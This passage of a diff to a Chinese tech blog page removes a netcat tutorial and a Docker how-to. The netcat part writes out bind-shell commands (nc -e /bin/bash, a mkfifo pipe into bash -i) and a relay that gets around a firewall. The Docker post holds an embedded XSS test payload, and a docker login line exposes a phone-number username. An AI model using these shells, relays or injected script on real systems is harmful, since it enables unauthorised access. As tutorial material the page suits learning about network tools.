-<h4 id="1-常用参数："><a href="#1-常用参数：" class="headerlink" title="1.常用参数："></a>1.常用参数：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">-4/6 使用IPv4/6地址</span><br><span class="line">-b 允许broadcast广播</span><br><span class="line">-c  发送CRLF（回车换行 Carriage-Return Line-Feed）当line-ending</span><br><span class="line">-d 不尝试读取stdin</span><br><span class="line">-I length 设置TCP接收的buffer的大小</span><br><span class="line">-i interval 设置发送和接收间的延迟秒数，</span><br><span class="line">-l 监听模式</span><br><span class="line">-n 直接使用ip,不通过域名服务器DNS查询域名</span><br><span class="line">-o length  设置TCP发送的buffer大小</span><br><span class="line">-P 代理名字</span><br><span class="line">-p nc使用的端口</span><br><span class="line">-v verbose更多输出信息</span><br><span class="line">-w timeout</span><br><span class="line">-u 使用UDP</span><br><span class="line">-r 随机选择端口</span><br><span class="line">-s source  设置本地主机送出数据包的IP地址</span><br></pre></td></tr></table></figure>
-<h4 id="2-使用例子"><a href="#2-使用例子" class="headerlink" title="2.使用例子"></a>2.使用例子</h4><h5 id="1-建立连接，聊天"><a href="#1-建立连接，聊天" class="headerlink" title="1.建立连接，聊天"></a>1.建立连接，聊天</h5><pre><code>nc -l port 在本地主机监听一个端口&lt;br&gt;
-nc ip port 在其它主机与之建立连接（默认TCP），发送消息
-</code></pre><h5 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2.端口扫描"></a>2.端口扫描</h5><pre><code>原理，进行tcp三次握手建立连接，如果成功则说明端口开放，容易被防火墙，IDS检测到&lt;br&gt;
-nc -v -n -z ip port(可以是范围)&lt;br&gt;
-    -v进行详细输出&lt;br&gt;
-    -n不进行域名查询&lt;br&gt;
-    -z建立连接后关闭连接，不进行数据交换&lt;br&gt;
-</code></pre><h5 id="3-数据传输-甚至可以传输流媒体）"><a href="#3-数据传输-甚至可以传输流媒体）" class="headerlink" title="3.数据传输(甚至可以传输流媒体）"></a>3.数据传输(甚至可以传输流媒体）</h5><pre><code>类似于聊天，只是将输入换成文件，使用重定向或者管道符&lt;br&gt;
-server:  nc -l port &lt; file1.txt&lt;br&gt;
-clien: nc -n ip port &gt; file2txt&lt;br&gt;
-file1往file2传数据&lt;br&gt;
-</code></pre><h5 id="4-获取shell，正反向shell"><a href="#4-获取shell，正反向shell" class="headerlink" title="4.获取shell，正反向shell"></a>4.获取shell，正反向shell</h5><pre><code>如果有-e参数，直接 nc ip port -e /bin/bash&lt;br&gt;
-无-e参数时:&lt;br&gt;
-server:&lt;br&gt;
-mkfifo /tmp/fifo&lt;br&gt;
-cat /tmp/fifo | /bin/bash -i 2&gt;&amp;1 | nc -l port &gt; /tmp/fifo&lt;br&gt;
-client:&lt;br&gt;
-nc ip port&lt;br&gt;
-原理：&lt;br&gt;
-bash -i 进入交互模式&lt;br&gt;
-通过mkfifo 建立一个管道（命令管道）文件，将管道文件的内容通过匿名管道传给/bin/bash执行，然后再将nc监听到的输入写入fifo,形成一个循环
-</code></pre><h5 id="5-端口转发"><a href="#5-端口转发" class="headerlink" title="5.端口转发"></a>5.端口转发</h5><pre><code>- 背景：192.168.1.103的msfadmin用户需要访问192.168.1.102的8000端口，但是该端口被防火墙保护着，不允许外界机器访问。目前msfadmin用户只能访问192.168.1.102的9000端口。需要9000端口做转发。
-- 目标：msfadmin通过访问192.168.1.102的9000端口，达到与8000端口通话的目的。
-原理：&lt;br&gt;
-在102上：nc -l 8000&lt;br&gt;
-              cat /tmp/fifo | nc localhost 8000 | nc -l 9000 &gt; /tmp/fifo
-在103上：&lt;br&gt;
-        nc 192.168.1.102 9000&lt;br&gt;
-在102主机上，开启要转发的8000端口，然后用9000端口通过接收数据，然后连接本地8000端口，将命令管道的数据通过匿名管道传给8000端口
-</code></pre>
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">linux</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/01/17/security/netcat/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-tools/docker" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/01/16/tools/docker/">docker</a>
-    </h1>
-  
-
-        
-        <a href="/2019/01/16/tools/docker/" class="archive-article-date">
-  	<time datetime="2019-01-16T09:25:54.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-01-16</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>docker的本意是希望容器是无状态的，即箱子有什么就用什么，我们外部不做修改，如果我需要改代码则重新build一个image出来。<br><br>镜像与容器，我的理解是将自己的程序做成镜像，放到容器中运行，容器提供运行环境。</p>
-<h4 id="一-install"><a href="#一-install" class="headerlink" title="一.install"></a>一.install</h4><p>ubuntu 16.04 LTS<br></p>
-<h5 id="1-sudo-apt-install-docker-io"><a href="#1-sudo-apt-install-docker-io" class="headerlink" title="1.sudo apt install docker.io"></a>1.sudo apt install docker.io</h5><h5 id="2-阿里镜像加速"><a href="#2-阿里镜像加速" class="headerlink" title="2.阿里镜像加速"></a>2.阿里镜像加速</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir -p /etc/docker</span><br><span class="line">sudo tee /etc/docker/daemon.json &lt;&lt;-&apos;EOF&apos;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;https://etuznpiq.mirror.aliyuncs.com&quot;]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>
-<p>保存为sh,执行</p>
-<h5 id="3-重启"><a href="#3-重启" class="headerlink" title="3.重启"></a>3.重启</h5><p>servie docker restart</p>
-<h5 id="4-登录"><a href="#4-登录" class="headerlink" title="4.登录"></a>4.登录</h5><p>sudo docker login –username=17888824094 registry.cn-hangzhou.aliyuncs.com</p>
-<h5 id="5-拉取远程镜像"><a href="#5-拉取远程镜像" class="headerlink" title="5.拉取远程镜像"></a>5.拉取远程镜像</h5><p>sudo docker pull microsoft/aci-helloworld</p>
-<h5 id="6-启动"><a href="#6-启动" class="headerlink" title="6.启动"></a>6.启动</h5><p>这是启动镜像<br><br>docker run  镜像 (-d deamon模式)<br><br>例: docker run -d -p 8888:80 microsoft/aci-helloworld<br><br>-p：物理机端口，要转发的端口，可以多个端口 -p 8888:8888 8889:8889 3000:3000<br><br>目录挂载:-v $PWD/www:/www  将主机中当前目录下的www挂载到容器的/www</p>
-<h5 id="7-查看"><a href="#7-查看" class="headerlink" title="7.查看"></a>7.查看</h5><p>docker ps 查看容器信息<br><br>docker logs 容器id   查看容器内日志</p>
-<h5 id="8-关闭"><a href="#8-关闭" class="headerlink" title="8.关闭"></a>8.关闭</h5><p>这是操作的容器<br><br>docker stop 容器id<br><br>docker ps -a  查看关闭的容器<br><br>docker restart 容器id    重启容器<br><br>docker rm 容器id  删除容器</p>
-<h5 id="9-进入container"><a href="#9-进入container" class="headerlink" title="9.进入container"></a>9.进入container</h5><p>sudo docker exec  -it 9a8(容器id前三位) /bin/sh<br><br>交互模式， /bin/sh为要使用的$PATH,进入容器内进行操作</p>
-<h5 id="10-保存对容器的修改"><a href="#10-保存对容器的修改" class="headerlink" title="10.保存对容器的修改"></a>10.保存对容器的修改</h5><p>对容器的修改默认是保存的<br><br>docker commit 698 name(生成一个新的版本名)</p>
-<h5 id="11-生成自己的image"><a href="#11-生成自己的image" class="headerlink" title="11.生成自己的image"></a>11.生成自己的image</h5><p>&lt;scr<script>ipt&gt;alert(“XSS”);&lt;/scr<script>ipt&gt;</p>
-</script></p>
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">tools</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">docker</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/01/16/tools/docker/">展开全文 >></a>
+          <a class="article-more-a" href="/2019/05/29/algorithm/sildewindow/manacher/">展开全文 >></a>
         </p>
       
 
@@ -980,7 +1298,7 @@ bash -i 进入交互模式&lt;br&gt;
   
   
     <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/page/6/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><span class="page-number current">7</span><a class="page-number" href="/page/8/">8</a><a class="page-number" href="/page/9/">9</a><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" href="/page/8/">Next &raquo;</a>
+      <a class="extend prev" rel="prev" href="/page/6/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><span class="page-number current">7</span><a class="page-number" href="/page/8/">8</a><a class="page-number" href="/page/9/">9</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><a class="extend next" rel="next" href="/page/8/">Next &raquo;</a>
     </nav>
   
 
